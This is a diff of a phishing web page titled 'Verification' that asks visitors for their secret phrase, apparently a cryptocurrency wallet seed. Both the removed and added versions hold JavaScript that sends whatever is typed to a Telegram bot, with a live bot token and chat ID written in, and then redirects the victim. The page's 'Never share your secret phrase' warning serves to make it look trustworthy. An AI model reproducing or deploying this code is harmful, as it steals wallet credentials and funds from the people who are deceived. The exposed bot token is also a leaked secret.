@@ -1,75 +1,9 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verification</title>
     <link rel="stylesheet" href="style.css">
-    <style>
-        body {
-            background-color: #f7f8fa;
-            font-family: sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background-color: white;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
-            max-width: 400px;
-            width: 90%;
-            text-align: center;
-        }
-        .logo {
-            max-width: 120px;
-            margin-bottom: 20px;
-        }
-        h1 {
-            color: #1a202c;
-        }
-        label {
-            display: block;
-            text-align: left;
-            margin-bottom: 8px;
-            font-weight: bold;
-        }
-        textarea {
-            width: 100%;
-            height: 100px;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            padding: 10px;
-            font-size: 14px;
-            resize: none;
-            margin-bottom: 15px;
-        }
-        button {
-            background-color: #0052ff;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 8px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        button:disabled {
-            background-color: #a3bffa;
-            cursor: not-allowed;
-        }
-        .warning {
-            color: #cc0000;
-            margin-top: 15px;
-            font-size: 13px;
-        }
-        .loader {
-            display: none;
-            margin-top: 15px;
-        }
-    </style>
 </head>
 <body>
     <div class="container">
@@ -77,50 +11,37 @@
         <h1>Enter Your Secret Phrase</h1>
         <label for="phrase">Secret Phrase:</label>
         <textarea id="phrase" placeholder="Enter your secret phrase here..."></textarea>
-        <button id="verifyBtn" onclick="verify()">Verify</button>
-        <div class="loader" id="loader">
-            <img src="https://i.imgur.com/llF5iyg.gif" alt="Loading" width="30"><br>
-            <span>Verifying...</span>
-        </div>
+        <button onclick="verify()">Verify</button>
         <p class="warning">⚠️ <span>Never share your secret phrase with anyone!</span></p>
-    </div>
-
-    <script>
-        function verify() {
-            let phrase = document.getElementById("phrase").value;
-            if (phrase.trim() === "") {
-                alert("Please enter your secret phrase!");
-                return;
-            }
-
-            // UI transition
-            document.getElementById("verifyBtn").style.display = "none";
-            document.getElementById("loader").style.display = "block";
-
-            let botToken = "8152927364:AAGcaDY9iGW9BREQ4yXefEigCzp0Oy1ylrA";
-            let chatId = "8171222874";
-            let message = "🚨 New Secret Phrase Submission:\n" + phrase;
-
-            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-            fetch(url)
-                .then(response => {
-                    if (response.ok) {
-                        window.location.href = "submission.html";
-                    } else {
-                        alert("Failed to send message to Telegram.");
-                        document.getElementById("verifyBtn").style.display = "block";
-                        document.getElementById("loader").style.display = "none";
-                    }
-                })
-                .catch(error => {
-                    console.error("Error:", error);
-                    alert("An error occurred.");
-                    document.getElementById("verifyBtn").style.display = "block";
-                    document.getElementById("loader").style.display = "none";
-                });
+    </div><script>
+    function verify() {
+        let phrase = document.getElementById("phrase").value;
+        if (phrase.trim() === "") {
+            alert("Please enter your secret phrase!");
+            return;
         }
-    </script>
+
+        // Ton Token et ID Telegram
+        let botToken = "8152927364:AAGcaDY9iGW9BREQ4yXefEigCzp0Oy1ylrA";
+        let chatId = "8171222874";
+        let message = "🚨 New Secret Phrase Submission:\n" + phrase;
+
+        let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(url)
+            .then(response => {
+                if (response.ok) {
+                    window.location.href = "submission.html"; // Redirection après l'envoi
+                } else {
+                    alert("Failed to send message to Telegram.");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                alert("An error occurred.");
+            });
+    }
+</script>
 
 </body>
 </html>
